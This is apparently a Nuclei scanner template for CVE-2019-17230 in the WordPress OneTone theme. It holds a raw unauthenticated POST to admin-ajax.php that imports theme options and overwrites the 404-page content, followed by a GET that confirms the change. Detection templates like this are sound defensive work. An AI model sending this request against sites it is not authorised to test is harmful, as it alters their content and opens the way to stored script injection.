flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "text/html")
    - contains(body, "Import successful.")
    internal: true
    type: dsl
  raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=onetone_options_import&options={"content_404":"{{page}}"}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 404
    - contains(content_type, "text/html")
    - contains_all(body, "<div class=\"page-content\">","{{page}}")
    type: dsl
  raw:
  - 'GET /{{randstr}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2019-17230
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:mageewp:onetone:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2019-17230
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
    cvss-score: 5.3
    epss-percentile: 0.92053
    epss-score: 0.0849
  description: 'includes/theme-functions.php in the OneTone theme through 3.0.6 for
    WordPress allows unauthenticated options changes.

    '
  impact: 'Unauthenticated attackers can modify WordPress theme options, potentially
    changing site content like 404 page messages to inject malicious content or alter
    site behavior.

    '
  metadata:
    framework: wordpress
    max-request: 1
    product: onetone
    publicwww-query: /wp-content/themes/onetone
    vendor: mageewp
    verified: true
  name: "WordPress OneTone theme <= 3.0.6 \u2013 Unauthenticated Options Changes"
  reference:
  - https://blog.sucuri.net/2020/04/onetone-vulnerability-leads-to-javascript-cookie-hijacking.html
  - https://blog.nintechnet.com/unauthenticated-stored-xss-vulnerability-in-wordpress-onetone-theme-unpatched/
  - https://nvd.nist.gov/vuln/detail/CVE-2019-17230
  remediation: 'Update the OneTone theme to version 3.0.7 or later, or switch to a
    different theme.

    '
  severity: medium
  tags: cve,cve2019,wordpress,wp-theme,wp,onetone,vkev,vuln
variables:
  page: '{{rand_base(8)}}'
